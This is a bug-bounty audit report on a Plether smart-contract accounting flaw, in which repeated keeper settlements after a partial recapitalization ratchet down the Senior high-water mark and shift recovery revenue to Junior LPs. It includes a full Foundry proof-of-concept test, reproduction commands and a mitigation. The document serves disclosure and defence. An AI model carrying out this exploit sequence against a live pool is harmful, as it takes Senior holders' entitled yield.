# \#99762 [SC-High] An unbacked recapitalization residual ratchets down the Senior high-water mark and redirects recovery revenue to Junior

**Submitted on Nov 15th 2026 at 06:24:16 UTC by @dtutila for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99762
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Summary

After trader claims exceed pool cash and wipe both LP tranches, the documented recovery is
`CfdEngine.recapitalizePool(X)` followed by `clearDegradedMode`. Only the portion backed by distributable assets
settles immediately; the claims gap `G` remains pending. The protocol test at
`packages/perps/test/perps/accounting/waterfall/HousePoolWaterfall.t.sol:201,217` requires the Senior high-water mark
(HWM) to remain `X` and Senior to recover to `X` when backing arrives.

When `G < X <= 2G`, a later permissionless `settleLpEpoch` reserves `G` again from assets already attributed to
Senior. The resulting shortfall is booked as a Senior loss, after which the empty-bootstrap path overwrites the HWM
with a lower value. Repeating this process ratchets the HWM down, allowing revenue that should restore Senior to
accrue to Junior.

## Bug Description

`HousePool` records the full recapitalization in `pendingRecapitalizationAssets`, but settles only
`min(bucket, distributable)` and retains the remainder. The first settlement therefore produces
`Senior = X - G` and `HWM = X`, as intended.

On a later reconciliation, `HousePoolReconcilePlanLib` subtracts the pending residual from distributable assets:

```solidity
// packages/perps/src/libraries/HousePoolReconcilePlanLib.sol:68-71,102-103
if (pendingBucketAssets > 0) {
    snapshot.distributable =
        snapshot.distributable > pendingBucketAssets ? snapshot.distributable - pendingBucketAssets : 0;
}

if (plan.deltaAssets > 0) {
    plan.state.waterfall = HousePoolWaterfallAccountingLib.absorbLoss(plan.state.waterfall, plan.deltaAssets);
}
```

At this point, distributable already backs Senior principal. Subtracting the residual again creates an artificial
shortfall that is absorbed as a Senior loss. When this zeroes the tranches, reapplying the bucket enters the
empty-bootstrap branch:

```solidity
// packages/perps/src/libraries/HousePoolPendingPreviewLib.sol:118-121
if (state.waterfall.seniorPrincipal == 0 && state.waterfall.juniorPrincipal == 0) {
    state.waterfall.seniorPrincipal += remaining;
    state.waterfall.seniorHighWaterMark =
        recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;
}
```

This overwrites the existing HWM instead of preserving the original recapitalization target. It contradicts
`packages/perps/ACCOUNTING_SPEC.md:337-340`, which states that losses do not reduce the Senior HWM, revenue restores
Senior to that mark before Junior, and reservation prevents double counting.

The owner performs only the documented recovery in `packages/perps/SECURITY.md:155-162`. Any address can trigger the
fault through the ordinary keeper path `settleLpEpoch`.

### Prior-audit distinction

`CECURO-2026-10-MED-12` uses the same bootstrap branch but has a different root cause: revenue continuation is
computed before recapitalization, causing revenue to become `unassignedAssets`. It has no claims deficit or repeated
reservation.

SCAS SC-L1 addressed uncapped pending credit and introduced the capped residual reservation. Its response says an
unsettled residual should remain pending and be applied once backed. Here, an intervening reconciliation instead
reserves it from value already attributed to Senior and lowers the HWM. Fixing MED-12 or SC-L1 does not prevent this
path.

## Impact

**High — theft of unclaimed yield.** Senior's protected recovery revenue is reassigned to Junior holders.

The deterministic test measures:

- HWM: `314,827.655543` to `144,811.008229` USDG.
- Actual Senior/Junior balances: `144,811.008229 / 13,510.941792` USDG.
- HWM=`X` control: `158,321.950021 / 0` USDG.
- Senior restoration revenue redirected to Junior: `13,510.941792` USDG.

The loss is bounded by `min(future revenue, X - final HWM)`. Senior principal is not reduced below distributable
assets, so this is loss of recovery priority rather than direct principal theft. No public operation restores the
lost entitlement after revenue reaches Junior.

The required state is uncommon: a total wipe followed by a partial recapitalization satisfying `G < X <= 2G`.
Those conditions affect feasibility and payout, not the demonstrated accounting impact.

## Proof of Concept

**Primary PoC:** attach `RecapHwmPackaged.t.sol`. It uses the pinned target contracts and a deterministic local Pyth
mock. The test asserts the post-recap state (`HWM == X`, a pending residual, and `G < X <= 2G`), executes six public
revenue epochs, and verifies that keeper settlements lower the HWM and redirect Senior restoration revenue to Junior.

Pinned commit: `a82d4fefb02768e5b3bddcc97dee371eee24fea8`.

Run it from a clean checkout:

```bash
git clone https://github.com/immunefi-team/audit-comp-plether target
cd target
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
npm ci --ignore-scripts
mkdir -p test
cp ../RecapHwmPackaged.t.sol test/
FOUNDRY_PROFILE=default forge test \
  --match-path test/RecapHwmPackaged.t.sol \
  --match-test test_recapHwm_keeperSettles_ratchetHwm_juniorTakesSeniorRestoration \
  -vvvv --offline
```

The attachment has SHA-256
`77b820e11b6d677e006a041005b6cde94206c87354666afc99ccb961e0e0ab0b`. The verified clean-checkout run passed one
test with no failures.

```text
[PASS] test_recapHwm_keeperSettles_ratchetHwm_juniorTakesSeniorRestoration() (gas: 25088101)
Suite result: ok. 1 passed; 0 failed; 0 skipped
```

## Recommended Mitigation

Preserve the existing HWM when applying recapitalization to an empty waterfall:
`HWM = max(existing HWM, recapitalization target, applied amount)`.

Also track the portion of a pending bucket not represented in claimant principal, and reserve only that amount.
Do not subtract a residual from distributable assets already backing Senior. Add a regression test that reconciles
before the residual obtains new backing and asserts that the HWM and existing Senior principal remain unchanged.


## Link to Proof of Concept

https://gist.github.com/dtutila/96dcc37b21627b68362270ef848f4f03

## Proof of Concept

// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../packages/perps/test/perps/BasePerpTest.sol";
import {SafeCast} from "../lib/openzeppelin-contracts/contracts/utils/math/SafeCast.sol";
import {CfdTypes} from "../packages/perps/src/CfdTypes.sol";
import {console2 as console} from "../lib/forge-std/src/console2.sol";

/// @notice Packaged primary PoC for recap-hwm-ratchet (same mechanism as RecapHwm.t.sol, one asserting test).
///  setUp (public paths + documented owner runbook, SECURITY.md:155-162):
///    public trading leaves trader claims > physical cash (both tranches wiped); owner recapitalizePool(X) with
///    gap G < X <= 2G, clearDegradedMode; keeper Router.settleLpEpoch settles the recap. Upstream-asserted state
///    (HousePoolWaterfall.t.sol:201): Senior HWM == X, residual pending recap == G (unbacked).
///  test: public revenue epochs (a trader's realized loss), each settled by the keeper. Every fresh reconcile
///    while the residual is unbacked re-reserves it against Senior's own principal
///    (HousePoolReconcilePlanLib.sol:68-71, :103) and the empty-bootstrap branch lowers the Senior HWM below X
///    (HousePoolPendingPreviewLib.sol:117-121). Revenue above the lowered HWM accrues to Junior while Senior is
///    still below X. Control: the HWM = X waterfall that the upstream test asserts, applied to the same S + J.
///  Value enters only through settlementToken.mint to EOAs and the owner wallet. Pyth is mocked.
contract RecapHwmPackaged is BasePerpTest {
    address[4] internal traders;
    address internal KEEPER = address(0x4EE9E4);
    address internal REV = address(0x5EE5);
    address internal JLP2 = address(0x1B002);
    uint256 internal price;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory params) {
        params = super._riskParams();
        params.vpiFactor = 0.01e18;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 400_000 * 1e6;
    }


    function _blob() internal returns (bytes[] memory b) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 t = vm.getBlockTimestamp();
        baseMockPyth.setAllUniquePrices(_basePythFeedIds(), SafeCast.toInt64(SafeCast.toInt256(price)), 0, int32(-8), t, t - 1);
        b = new bytes[](1);
        b[0] = abi.encode(price);
    }

    function _mark(uint256 p) internal {
        price = p;
        bytes[] memory b = _blob();
        vm.prank(KEEPER);
        router.updateMarkPrice(b);
    }

    function _exec() internal {
        uint64 id = router.nextExecuteId();
        bytes[] memory b = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        router.executeOrder(id, b);
    }

    function _commit(address t, uint8 side, uint256 size, uint256 margin, bool close) internal returns (bool ok) {
        vm.prank(t);
        (ok,) = address(router).call(abi.encodeWithSignature(
            "commitOrder(uint8,uint256,uint256,uint256,bool)", side, size, margin, uint256(0), close
        ));
        if (ok) _exec();
    }

    function _settle() internal returns (bool ok) {
        bytes[] memory b = _blob();
        vm.prank(KEEPER);
        (ok,) = address(router).call(abi.encodeWithSignature("settleLpEpoch(bytes[])", b));
    }

    function _log(string memory tag) internal view {
        console.log(tag);
        console.log("  S / J / H:", pool.seniorPrincipal(), pool.juniorPrincipal(), pool.seniorHighWaterMark());
        console.log("  U / pendRecap / pendRev:", pool.unassignedAssets(), pool.pendingRecapitalizationAssets(), pool.pendingTradingRevenueAssets());
        console.log("  physical / claims / degraded:", pool.totalAssets(), engine.totalTraderClaimBalanceAssets(), engine.degradedMode() ? 1 : 0);
    }

    /// @dev lane-11a prelude (public trading only).
    function _makeClaim() internal {
        price = 1e8;
        _mark(price);
        for (uint256 i; i < 4; ++i) {
            settlementToken.mint(traders[i], 2_000_000e6);
            vm.startPrank(traders[i]);
            settlementToken.approve(address(clearinghouse), type(uint256).max);
            clearinghouse.deposit(traders[i], 2_000_000e6);
            vm.stopPrank();
        }
        for (uint256 i; i < 4; ++i) {
            uint256 depth = pool.totalAssets();
            bool isLong = i % 2 == 0;
            uint256 notional = (depth * 38) / 100;
            uint256 size = ((notional * 1e20) / price / 1e20) * 1e20;
            uint256 margin = isLong ? (notional * 9) / 10 : notional / 5;
            _commit(traders[i], isLong ? 0 : 1, size, margin, false);
        }
        for (uint256 k; k < 5; ++k) _mark((price * 110) / 100);
        for (uint256 j = 1; j < 4; j += 2) {
            (uint256 psz,,,,,,) = engine.positions(traders[j]);
            if (psz > 0) _commit(traders[j], 1, psz, 0, true);
        }
        for (uint256 k; k < 20; ++k) _mark((price * 85) / 100);
        uint256[2] memory order = [uint256(2), uint256(0)];
        for (uint256 j; j < 2; ++j) {
            (uint256 psz,,,,,,) = engine.positions(traders[order[j]]);
            if (psz > 0) _commit(traders[order[j]], 0, psz, 0, true);
        }
        for (uint256 i; i < 4; ++i) {
            (uint256 psz,,,,,,) = engine.positions(traders[i]);
            assertEq(psz, 0, "prelude leaves no open position");
        }
        assertGt(engine.totalTraderClaimBalanceAssets(), 0, "a trader claim exists");
    }

    uint256 internal X;
    uint256 internal G;
    uint256 internal hOld;
    address[8] internal jlps;

    function setUp() public override {
        super.setUp();
        for (uint256 i; i < 4; ++i) traders[i] = address(uint160(0x7A000 + i));
        for (uint256 k; k < 8; ++k) jlps[k] = address(uint160(0x1C000 + k));
        // An ordinary junior LP queues a small redeem before trading; its maturity lets the keeper settle an LP epoch
        // after the recap (HousePool.sol:1183-1184 reverts with no epoch work).
        uint256 jsh = juniorVault.balanceOf(address(this)) / 100;
        juniorVault.requestRedeem(jsh, address(this), address(this));
        juniorVault.transfer(JLP2, jsh);
        _makeClaim();
        hOld = pool.seniorHighWaterMark();
        uint256 claims = engine.totalTraderClaimBalanceAssets();
        uint256 ta = pool.totalAssets();
        assertLt(ta, claims, "PRECONDITION: physical < trader claims (both tranches wiped)");
        uint256 gap = claims - ta;
        // Owner's documented recovery with a partial recap: X = gap + 20% of the old HWM (G < X <= 2G).
        X = gap + (hOld * 2000) / 10_000;
        settlementToken.mint(address(this), X);
        settlementToken.approve(address(engine), X);
        engine.recapitalizePool(X);
        if (engine.degradedMode()) engine.clearDegradedMode();
        _mark(1e8);
        assertTrue(_settleUntilOk(), "keeper settleLpEpoch after recap");
        G = pool.pendingRecapitalizationAssets();
        assertGt(G, 0, "residual recap pending");
        assertLe(X, 2 * G, "window G < X <= 2G");
        assertEq(pool.seniorHighWaterMark(), X, "upstream-asserted: residual recap preserves Senior target X");
        uint256 per = juniorVault.balanceOf(address(this)) / 1000;
        for (uint256 k; k < 8; ++k) juniorVault.transfer(jlps[k], per);
        settlementToken.mint(REV, 5_000_000e6);
        vm.startPrank(REV);
        settlementToken.approve(address(clearinghouse), type(uint256).max);
        clearinghouse.deposit(REV, 5_000_000e6);
        vm.stopPrank();
    }

    function _settleUntilOk() internal returns (bool ok) {
        for (uint256 w; w < 400 && !ok; ++w) {
            vm.warp(vm.getBlockTimestamp() + 1 hours);
            ok = _settle();
        }
    }

    function _queueRedeem(address lp) internal {
        uint256 m = juniorVault.maxRequestRedeem(lp);
        vm.prank(lp);
        juniorVault.requestRedeem(m, lp, lp);
    }

    /// @dev One LP epoch of public revenue: a trader opens a long sized to `pct`% of distributable, loses 30% on price,
    ///      closes; a junior LP queues a redeem (gives the keeper LP-epoch work); the keeper settles.
    function _revenueEpoch(address lp, uint256 pct) internal {
        uint256 eff = pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
        uint256 size = (((eff * pct) / 100) * 1e20 / 1e8 / 1e20) * 1e20;
        _commit(REV, 0, size, (size * 1e8) / 1e20 / 2, false);
        (uint256 psz,,,,,,) = engine.positions(REV);
        if (psz == 0) {
            // Larger sizes can exceed the pool's open-interest backing; fall back to the original PoC's 30%.
            size = (((eff * 30) / 100) * 1e20 / 1e8 / 1e20) * 1e20;
            _commit(REV, 0, size, (size * 1e8) / 1e20 / 2, false);
            (psz,,,,,,) = engine.positions(REV);
        }
        assertGt(psz, 0, "revenue trader opened");
        _mark((1e8 * 13_000) / 10_000);
        _commit(REV, 0, psz, 0, true);
        _mark(1e8);
        _queueRedeem(lp);
        assertTrue(_settleUntilOk(), "keeper settleLpEpoch");
        _log("epoch");
    }

    function test_recapHwm_keeperSettles_ratchetHwm_juniorTakesSeniorRestoration() public {
        uint256 revStart = pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
        uint256 n;
        for (uint256 e; e < 8; ++e) {
            _revenueEpoch(jlps[e], 40);
            n = e + 1;
            if (pool.juniorPrincipal() > 0) break;
        }
        uint256 s = pool.seniorPrincipal();
        uint256 j = pool.juniorPrincipal();
        uint256 h = pool.seniorHighWaterMark();
        uint256 t = s + j;
        // Documented control (upstream HousePoolWaterfall.t.sol:201,217; ACCOUNTING_SPEC.md:337-338): the residual
        // recap keeps Senior's target at X and LP-owned recovery restores Senior to X before Junior.
        uint256 sDoc = t < X ? t : X;
        uint256 jDoc = t - sDoc;
        console.log("epochs run", n);
        console.log("hOld / residual G / X:", hOld, G, X);
        console.log("Senior HWM final:", h);
        console.log("final S / J (code):", s, j);
        console.log("final S / J (HWM = X control):", sDoc, jDoc);
        console.log("revenue over epochs (distributable delta):",
            (pool.totalAssets() - engine.totalTraderClaimBalanceAssets()) - revStart);
        console.log("Senior shortfall = Junior gain vs HWM = X control:", j - jDoc);
        assertLt(h, X, "IMPACT: keeper settles ratchet the Senior HWM below the owner's recap target X");
        assertLt(s, sDoc, "IMPACT: Senior is below the HWM = X waterfall");
        assertGt(j, jDoc, "IMPACT: Junior holds revenue the HWM = X waterfall assigns to Senior");
    }
}

